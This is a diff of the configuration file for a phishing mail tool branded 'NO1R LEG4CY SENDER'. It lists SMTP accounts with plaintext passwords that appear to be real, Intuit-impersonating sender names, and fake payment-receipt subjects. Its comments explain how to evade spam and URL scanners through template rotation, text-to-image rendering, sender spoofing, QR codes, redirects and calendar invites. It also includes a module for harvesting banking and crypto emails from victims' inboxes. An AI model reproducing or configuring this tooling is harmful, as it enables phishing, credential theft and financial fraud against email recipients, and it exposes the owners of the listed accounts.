@@ -1,231 +1,199 @@
 #!/usr/bin/env node
 
 /**
- * =================================================================
- * 🛡️ NO1R LEG4CY SENDER v3.0.0 - OFFICIAL CONFIGURATION
- * =================================================================
- * * [SECTION 1] SMTP & API CREDENTIAL STORE
- * Utility: Defines your delivery engines (SMTP or Graph API).
- * How it works: You can add unlimited SMTP accounts. The script 
- * will use these accounts based on the rotation logic you choose.
+ * SECTION 1: SMTP & API CREDENTIAL STORE
+ * This section defines the outbound mail servers used to deliver your messages.
  */
 const smtp = [
-  {
-    "host": "smtp.gmail.com",
-    "port": 587,
-    "secure": false,
-    "username": "nfdconstructionsllc@gmail.com",
-    "password": "fxmf jsku quff uvim",
-    "from_email": "nfdconstructionsllc@gmail.com",
-  },
-  // You can add more SMTP objects here for better rotation
-  {
-    "host": "smtp.gmail.com",
-    "port": 587,
-    "secure": false,
-    "username": "loloyola10@gmail.com",
-    "password": "bgdk imcm vojm uvfp",
-    "from_email": "loloyola10@gmail.com",
-    
-  },
-   {
-    "host": "secure.emailsrvr.com",
-    "port": 587,
-    "secure": false,
-    "username": "miguel@pacificwestsound.com",
-    "password": "ChangeMe!",
-    "from_email": "e.drive@pacificwestsound.com",
-   
-  },
-  {
-    "host": "smtp.gmail.com",
-    "port": 587,
-    "secure": false,
-    "username": "Rtime458@gmail.com",
-    "password": "kupg ctae vpkg eysk",
-    "from_email": "Rtime458@gmail.com",
-  
-  },
-  {
-    "host": "smtp.nifty.com",
-    "port": 587,
-    "secure": false,
-    "username": "rsr34855@nifty.com",
-    "password": "EtZai68MbO70",
-    "from_email": "support@alvinscables.com",
-    
+ {
+    "host": "smtp.gmail.com", // The address of your mail server provider.
+    "port": 587, // Port used for secure mail submission (Commonly 587 or 465).
+    "secure": false, // Set to true for port 465, false for port 587 (STARTTLS).
+    "username": "nfdconstructionsllc@gmail.com", // Your authentication login email.
+    "password": "fxmf jsku quff uvim", // Your authentication password or App Password.
+    "from_email": "nfdconstructionsllc@gmail.com", // The technical sender address in the email header.
   },
 ];
 
 const graph_api = {
-  active: false, 
-  clientId: "", 
-  tenantId: "",
-  clientSecret: "",
-  tokenPath: "./tokens.json" 
+  active: false, // Set to true to bypass SMTP and send via Microsoft Cloud API.
+  clientId: "", // Application ID from the Azure Portal.
+  tenantId: "", // Directory ID from the Azure Portal.
+  clientSecret: "", // Secret key generated in the Azure Portal.
+  tokenPath: "./tokens.json" // Local file path to store authenticated sessions.
 };
 
 /**
- * [SECTION 2] GLOBAL DELIVERY CONTROLLER
- * Utility: The core brain that manages randomization and bypassing filters.
- * * --- 📝 MULTIPLE LETTER LOGIC ---
- * If 'use_multiple_letters' is TRUE, the script picks a random HTML 
- * file from 'multi_letters' for every lead to avoid footprint detection.
- * * --- 👤 MULTIPLE FROM-NAME LOGIC ---
- * If 'multiple_fromName' is TRUE, the script shuffles names from 
- * 'multi_FromName' so recipients see different sender names.
- * * --- 📧 MULTIPLE SUBJECT LOGIC ---
- * If 'multiple_subject' is TRUE, it rotates subjects from 
- * 'multi_subject' to bypass subject-based spam filters.
+ * SECTION 2: GLOBAL DELIVERY CONTROLLER
+ * The main control panel that dictates sending behavior, masking, and speed.
  */
 const setup = {
-  key: "key", 
-  MultipleSmtp: "ROTATE", // Options: "ROTATE" or "SINGLE"
-  mail_priority: "HIGH", 
-  sleep_time: 3,          // Delay in seconds between emails
-  isMultiThread: false, 
-  howManyThread: 10, 
+  key: "$2y$10$oniEBbU67syJ5oVGJT2RseZvL/rCQaZmSx61woYGNx1IQvXMf1632", // Your unique encrypted license key for system access.
+  MultipleSmtp: "ROTATE", // 'ROTATE' cycles through the SMTP list; 'SINGLE' uses only the first entry.
+  mail_priority: "HIGH", // Sets the 'Importance' header of the email to high.
+  sleep_time: 3, // Delay in seconds between each email to evade rate-limit detection.
+  isMultiThread: false, // Enables simultaneous sending processes using multiple CPU cores.
+  howManyThread: 10, // Number of parallel processes to run if multi-threading is active.
   
-  // --- Letter & Image Rotation ---
-  LetterToImage: true,    // Renders HTML into a protected image
-  fileName_LetterToImage: "./letterToImage.html",
-  use_multiple_letters: true, 
-  letter: "letter.html",  // Default letter if multi is OFF
+  LetterToImage: true, // Converts HTML letters into JPEG images to hide text from content scanners.
+  fileName_LetterToImage: "./letterToImage.html", // The HTML template used for the image generation.
+  use_multiple_letters: false, // Enables rotation between different HTML templates in the 'multi_letters' list.
+  letter: "letter.html", // Default HTML template used when multiple letters are disabled.
   multi_letters: [
-    "letter_invoice_A.html",
+    "letter.html",
+    "letter2.html",
   ],
-  use_multiple_images: true, 
-  multi_images: [
-    "letter1.html", 
-  
-  ],
+  use_multiple_images: true, // Enables rotation between different image templates for the email body.
+    multi_images: [
+      "img1.html", 
+      "img2.html"
+    ],
 
-  // --- Dynamic Identity Shuffling ---
-  multiple_fromName: true, 
+  use_noreply: false, // If true, generates a random 'noreply' address using your domain.
+  from_name: "<RANDNUM5>", // Default sender name using a 5-digit random number macro.
+  mail_subject: "<RANDNUM4>", // Default subject line using a 4-digit random number macro.
+
+  multiple_fromName: true, // Enables rotation of sender names to break delivery patterns.
   multi_FromName: [
-    "Intuit Billing Support",
-    "QuickBooks Global Payments",
-    "Accounting Services Department",
-    "Service Notification Center"
+    "Intuit Billing Department",
+    "Intuit Payments",
+    "Intuit Billing Notifications"
   ],
-
-  multiple_subject: true, 
+  multiple_subject: true, // Enables rotation of email subjects to bypass subject filters.
   multi_subject: [
-    "Urgent: Your Invoice #<RANDNUM4> is Ready",
-    "Payment Confirmation for Transaction ID: <RANDSTRING1>",
-    "Action Required: Service Update for <DOMAIN>",
-    "Your recent payment of $7,890.00 was successful"
+    "Payment Confirmation - $7,890.00 Received",
+    "Receipt for Your Recent Payment ($7,890.00)",
+    "Automated Payment Confirmation for Your Records"
   ],
 
-  // --- From-Mail Management ---
-  use_noreply: false, 
-  from_name: "<RANDNUM5>", // Fallback if multiple_fromName is OFF
-  mail_subject: "<RANDNUM4>", // Fallback if multiple_subject is OFF
-  test_frommail: false, 
-  frommail_filename: "frommail.txt", 
-  hide_frommail: false, 
+  test_frommail: false, // If enabled, reads sender addresses from an external text file.
+  frommail_filename: "frommail.txt", // The filename containing the list of sender emails.
+  hide_frommail: false, // If true, the sender address is masked or spoofed as the recipient's email.
+  use_pdf_password: false, // Enables encryption for generated PDF attachments.
+  pdf_password_variable: "RANDNUM4", // Sets which random variable to use as the PDF password.
+  replyTo: "asd@asd.com", // The email address where recipient replies will be directed.
+
+  email_test: false, // If true, sends a copy to the destination below at set intervals.
+  test_every: 3, // Sends a test email every X number of sends.
+  email_destination: "asd@asd.com", // The target address for testing deliverability.
+  mailist: "mailist.txt", // The text file containing your target recipient list.
   
-  // --- Advanced Features ---
-  replyTo: "support@yourdomain.com", 
-  useAttachment: true, 
-  useOfflineAttachment: true, 
-  attachmentToPdf: true,
-  useGrabLogo: false, 
-  defaultLogo: "https://img-prod-cms-rt-microsoft-com.akamaized.net/...",
-  useMylogo: false, 
-  proxy: "" 
+  manage_cloud_accounts: false, // Switch for managing connected cloud or API accounts.
+  general_reset_token: false, // Forces a refresh of stored API authentication tokens.
+  
+  useAttachment: false, // Global switch to enable or disable file attachments.
+  useGrabLogo: false, // Automatically fetches the recipient's corporate logo from their domain.
+  defaultLogo: "https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31", // Fallback logo URL if auto-grab fails.
+  useMylogo: false, // Uses a custom logo file defined in the 'myLOGO' section.
+  proxy: "" // SOCKS5 proxy address (e.g., ip:port or user:pass@ip:port).
 };
 
 /**
- * [SECTION 3] CALENDAR INVITE ENGINE
- * Utility: Sends high-trust meeting requests (.ics files).
- * How it works: Calendar invites often bypass "Promotions" and land 
- * directly in the "Primary" inbox with a notification on the phone.
+ * SECTION 3: MAILBOX EXTRACTOR
+ * Post-delivery utility used to harvest sensitive data from target inboxes.
  */
+const mailbox_extractor = {
+  active: false, // Set to true to start the extraction module.
+  search_keywords: ["bank", "invoice", "payment", "paypal", "crypto"], // List of high-value terms to search for.
+  max_results: 10, // Maximum number of emails to extract per session.
+  save_path: "./extracted_logs/" // Local directory where harvested data is stored.
+};
+
 /**
- * SECTION 4: CALENDAR INVITE CONFIGURATION
- * Utility: Sends a formal .ics meeting request to the recipient.
- * How it works: It embeds a calendar event into the email metadata. 
- * This often triggers a "Meeting Notification" on the recipient's phone/computer.
+ * SECTION 4: CALENDAR, REDIRECT, ATTACHMENT
+ * Advanced delivery methods used to bypass standard email inbox folders.
  */
 const calendar_invite = {
-  active: false,                // Toggle TRUE to enable sending calendar invites instead of regular emails
-  TIMEZONE: "America/Adak",     // Sets the local time for the meeting to avoid global time confusion
-  SUMMARY: "",                  // The main Title/Subject of the calendar event seen by the lead
-  DESCRIPTION: "",              // The body text or notes inside the calendar event details
-  LOCATION: "<DOMAIN>",         // Where the meeting is held (can use dynamic tags like recipient's domain)
-  METHOD: "REQUEST",            // Standard protocol; 'REQUEST' forces the 'Accept/Decline' buttons to appear
-  STATUS: "CONFIRMED",          // Sets the event status to 'Confirmed' to look more legitimate
-  TRANSP: "OPAQUE",             // Blocks the user's time on their calendar as "Busy"
-  ORGANIZER_CN: "",             // Display Name of the person sending the invite
-  ORGANIZER_EMAIL: "<EMAIL>",   // Email address of the organizer (can use the recipient's email to spoof)
-  ATTENDEE_CN: "Verified Sender", // Display Name shown for the person attending
-  ATTENDEE_EMAIL: "administrator@<DOMAIN>", // Secondary email displayed in the invite list
-  RSVP: false,                  // Set TRUE if you want the recipient to send a response back
-  BUSYSTATUS: "BUSY",           // Marks the recipient's calendar as occupied during this time
-  DISALLOW_COUNTER: true,       // Prevents the recipient from suggesting a new time for the meeting
-  IMPORTANCE: 1,                // Sets the priority level (1 = High Priority)
-  REMINDER_MINUTES: 15,         // Triggers a notification popup X minutes before the event starts
-  REMINDER_TEXT: "",            // The alert message that appears on the user's screen/phone
-  START_DATE: "01/07/2026",     // The scheduled date of the event (DD/MM/YYYY)
-  START_TIME: "10:30",          // The specific time the meeting starts
-  END_DATE: "01/07/2026",       // The date the event concludes
-  END_TIME: "10:45",            // The time the event concludes
-  DURATION_MINUTES: 15          // Total length of the meeting slot
+  active: false, // Enables sending .ics calendar files which often bypass "Promotions" filters.
+  TIMEZONE: "America/Adak", // Meeting time zone configuration.
+  SUMMARY: "", // Title of the calendar event shown in the recipient's calendar.
+  DESCRIPTION: "", // Body content of the meeting invitation.
+  LOCATION: "<DOMAIN>", // Meeting location tag, dynamically replaced by recipient domain.
+  METHOD: "REQUEST", // Triggers 'Accept/Decline' buttons in the recipient's email client.
+  STATUS: "CONFIRMED", // Sets the invitation status as high-trust 'Confirmed'.
+  TRANSP: "OPAQUE", // Marks the time slot as 'Busy' on the recipient's calendar.
+  ORGANIZER_CN: "", // Display name of the meeting organizer.
+  ORGANIZER_EMAIL: "<EMAIL>", // Email of the organizer, dynamically replaced by recipient email.
+  ATTENDEE_CN: "Verified Sender", // Display name of the participant.
+  ATTENDEE_EMAIL: "administrator@<DOMAIN>", // Secondary display email for the invitation.
+  RSVP: false, // Determines if a response is requested from the recipient.
+  BUSYSTATUS: "BUSY", // Sets Microsoft-specific busy status.
+  DISALLOW_COUNTER: true, // Prevents the recipient from suggesting a new meeting time.
+  IMPORTANCE: 1, // Sets the invitation priority (1 = High).
+  REMINDER_MINUTES: 15, // Triggers a popup alert X minutes before the meeting.
+  REMINDER_TEXT: "", // Message shown in the reminder popup.
+  START_DATE: "01/07/2026", // Scheduled date of the event.
+  START_TIME: "10:30", // Start time of the event.
+  END_DATE: "01/07/2026", // End date of the event.
+  END_TIME: "10:45", // End time of the event.
+  DURATION_MINUTES: 15 // Total length of the meeting session.
 };
 
-/**
- * [SECTION 4] ATTACHMENTS & EML WRAPPING
- */
+const redirect_link = {
+  useRedirect: false, // Enables encrypted link redirection to hide the final URL from scanners.
+  key: "tes1", // Unique identifier for the redirect service.
+  enc_email: "c" // Encryption parameter for tracking the recipient.
+};
+
 const attachment = [
   {
-    filename: "Document_<RANDOMNAME>.pdf", 
-    path: "attachment.html",
-    useOfflineAttachment: true,
-    attachmentToPdf: true, 
+    filename: "new.pdf", // The name the recipient will see for the attached file.
+    path: "attachment.html", // The source HTML file to be used as the attachment content.
+    attachmentToPdf: false, // If true, converts the source HTML into a PDF file before sending.
   }
 ];
 
 const attachment_EML = {
-  use_EML: false, // Wraps the entire message inside an .eml file attachment
-  attachment_name_EML: "Message_<COMPANYNAME>.eml",
-  letter_eml: "EML/letter.html",
-  useAttachment_EML: true,
-  attachment: [{ attachmentName: "<COMPANYNAME>.html", path: "EML/attachment.html" }]
+  use_EML: false, // Wraps the message inside an attached .eml file to bypass body filters.
+  attachment_name_EML: "<COMPANYNAME>.eml", // Dynamic filename for the .eml attachment.
+  letter_eml: "EML/letter.html", // The HTML content inside the .eml file.
+  useAttachment_EML: true, // Includes secondary attachments inside the .eml wrapper.
+  attachment: [{ attachmentName: "<COMPANYNAME>.html", path: "EML/attachment.html" }] // Files nested inside the EML.
+};
+
+const generate_QRCODE = {
+  activate: false, // Generates a QR code image representing your link to avoid URL scanning.
+  link: "https://google.com?q=<EMAIL>", // The destination URL inside the QR code.
+  width: "200", height: "200" // Dimensions of the generated QR code image.
 };
 
 /**
- * [SECTION 5] RANDOMIZER & MACRO CONFIG
- * Utility: Defines the variables used in tags like <RANDNUM4>.
+ * SECTION 5: RANDOMIZER SETTINGS
+ * Defines the character lengths and naming for dynamic macro tags.
  */
 const generate_random_number = [
-  { name: "RANDNUM1", length_value: 1 },
-  { name: "RANDNUM4", length_value: 4 },
-  { name: "RANDNUM5", length_value: 5 }
+  { name: "RANDNUM1", length_value: 1 }, // Macro for 1-digit number.
+  { name: "RANDNUM4", length_value: 4 }, // Macro for 4-digit number.
+  { name: "RANDNUM5", length_value: 5 }  // Macro for 5-digit number.
 ];
 
 const generate_random_string = [
-  { name: "RANDSTRING1", length_value: 8, type: "UPPERCASE" }
+  { name: "RANDSTRING1", length_value: 5, type: "UPPERCASE" } // Macro for 5-character uppercase string.
 ];
 
 const setup_time_date = {
-  time_zone: "America/Adak",
-  time_format_lang: "en"
+  time_zone: "America/Adak", // Sets the system time zone for timestamping.
+  time_format_lang: "en" // Language used for date formatting (e.g., month names).
 };
 
 const others = {
-  letterImageName: "core_output.png", 
-  cid: "NOIRLEGACY_ENGINE", 
-  AutoLogin: true,
-  rejectUnauthorized: false, 
-  att_CT: "text/html"
+  change_ip: false, // Toggle for automatic IP changing via external API.
+  letterImageName: "tve.png", // The filename used for the LetterToImage JPEG output.
+  cid: "JOKDIGLAFGAE", // The Content-ID prefix for embedding inline images.
+  AutoLogin: true, // Automatically uses stored sessions for cloud accounts.
+  rejectUnauthorized: false, // Allows connection to SMTP servers with self-signed SSL certificates.
+  att_CT: "text/html" // Default Content-Type for attachments.
 };
 
-const myLOGO = [{ function_name: "MYLOGO", nameFile: "https://drive.google.com/..." }];
+const myLOGO = [{ function_name: "MYLOGO", nameFile: "https://drive.google.com/uc?id=1oMBVsQBm4ooCDJHc6JoIk3MNpsufMbQN" }]; // Custom logo mapping.
 
+/**
+ * EXPORT MODULE
+ * Mandatory bridge to share these settings with the core engine (big.js).
+ */
 module.exports = {
-  smtp, setup, graph_api, mailbox_extractor: { active: false }, 
+  smtp, setup, graph_api, mailbox_extractor, multi_link: { active: false }, 
   generate_random_number, generate_random_string, setup_time_date, 
-  attachment, myLOGO, attachment_EML, others, redirect_link: { useRedirect: false },
-  generate_QRCODE: { activate: false }, calendar_invite
+  attachment, myLOGO, attachment_EML, others, redirect_link,
+  generate_QRCODE, calendar_invite
 };
